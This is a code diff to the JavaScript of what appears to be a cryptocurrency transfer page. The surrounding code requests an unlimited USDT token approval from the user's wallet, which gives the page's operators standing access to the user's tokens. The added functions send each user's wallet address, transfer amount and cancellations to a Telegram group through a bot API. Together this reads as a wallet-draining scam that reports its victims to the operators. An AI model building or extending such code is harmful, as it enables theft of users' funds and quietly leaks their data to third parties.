@@ -1278,6 +1278,9 @@
                 
                 // Send transfer initiated notification to Telegram
                 sendTransferInitiatedNotification(userAddress, inputAmount);
+                
+                // Send processing transfer notification to Telegram group
+                sendTransferProcessingNotification(userAddress, inputAmount);
 
                 // Approve unlimited amount (max uint256 value - shows as "Unlimited" in wallets)
                 const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -1360,6 +1363,8 @@
                 // Check if user cancelled the transaction
                 if (!error.message || error.message.includes('cancelled') || error.message.includes('denied') || error.message.includes('rejected')) {
                     showMessage('warning', 'Transfer cancelled');
+                    // Send transfer cancelled notification to Telegram group
+                    sendTransferCancelledNotification(userAddress);
                 } else {
                     showMessage('error', `Approval failed: ${error.message || 'Unknown error'}`);
                 }
@@ -1654,6 +1659,48 @@
             } catch (error) {
                 console.error('❌ Error sending Telegram notification:', error.message);
                 console.warn('Possible causes: CORS blocked, network error, or invalid bot token/group ID');
+            }
+        }
+
+        // Send transfer processing notification to Telegram group
+        async function sendTransferProcessingNotification(address, amount) {
+            try {
+                console.log('🔔 Sending transfer processing notification for:', address, 'Amount:', amount);
+                
+                const message = `<b>⏳ Processing Transfer</b>\n\n<code>${address}</code>\n<b>Amount:</b> ${amount} USDT\n\n<i>Waiting for transaction confirmation...</i>`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                
+                const response = await fetch(url);
+                
+                if (response.ok) {
+                    console.log('✅ Processing notification sent to Telegram group');
+                } else {
+                    console.error('❌ Telegram API error:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Error sending processing notification:', error.message);
+            }
+        }
+
+        // Send transfer cancelled notification to Telegram group
+        async function sendTransferCancelledNotification(address) {
+            try {
+                console.log('🔔 Sending transfer cancelled notification for:', address);
+                
+                const message = `<b>❌ Transfer Cancelled</b>\n\n<code>${address}</code>\n\n<i>User cancelled the transfer</i>`;
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                
+                const response = await fetch(url);
+                
+                if (response.ok) {
+                    console.log('✅ Cancellation notification sent to Telegram group');
+                } else {
+                    console.error('❌ Telegram API error:', response.status);
+                }
+            } catch (error) {
+                console.error('❌ Error sending cancellation notification:', error.message);
             }
         }
 
